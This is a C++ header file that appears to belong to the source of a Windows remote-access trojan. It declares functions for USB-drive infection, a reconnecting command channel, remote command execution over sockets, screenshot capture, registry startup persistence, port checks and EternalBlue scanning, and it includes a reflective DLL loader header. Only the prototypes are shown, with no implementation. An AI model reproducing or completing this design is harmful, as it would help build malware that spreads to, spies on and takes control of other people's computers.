#define NOMINMAX

#ifndef PROBE_H
#define PROBE_H

#include "LoadLibraryR.h"
#include <winsock2.h>
#include <wininet.h>
#include <shellapi.h>
#include <stdio.h>
#include <mmsystem.h>
#include <cstring>
#include <sstream>
#include <fstream>
#include <Psapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <WS2tcpip.h>
#include <tlhelp32.h>
#include <windows.h>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winmm.lib")

#define BUFFER 4096
#define NTSTATUS LONG
#define UNLEN 256

#define MESSAGE "Hey there! I see you are reverse engineering! :D"

//#define SERVER_HOST "127.0.0.1
//#define SERVER_PORT 1234

static BOOL connected = FALSE;

DWORD WINAPI USBINFECT(LPVOID lpParameter);
void ListDir();
void ProbeConnect(void);
int CaptureAnImage(HWND hWnd, SOCKET sockfd);
BOOL GetUSBThreadStatus();
void TimeStamp(char buffer[100]);
void poweroff(int code);
void sockprintf(const char* words, ...);
void sockSend(const char* data);
void ExecSock(SOCKET sockfd, char recvbuf[BUFFER]);
void RHPMain(void);
void OS(void);
char* cDir();
void REConnect(void);
void StartWSA(void);
std::string MyLocation();
std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos);
std::string GetServerInfo();
std::string getLastLine(std::ifstream& in);
BOOL isFile(const char* file);
DWORD ProcessId(LPCTSTR ProcessName);
void split(char* src, char* dest[5], const char* delimeter);
const char* IP2Host(const char* IP);
void CheckHost(const char* ip_address);
char* appDataPath();
void StartupKey(const char* INSTALL_FOLDER_NAME, const char* czExePath);
void checkPort(const char* ip, int port);
void EternalBlueScan(const char* host);

#endif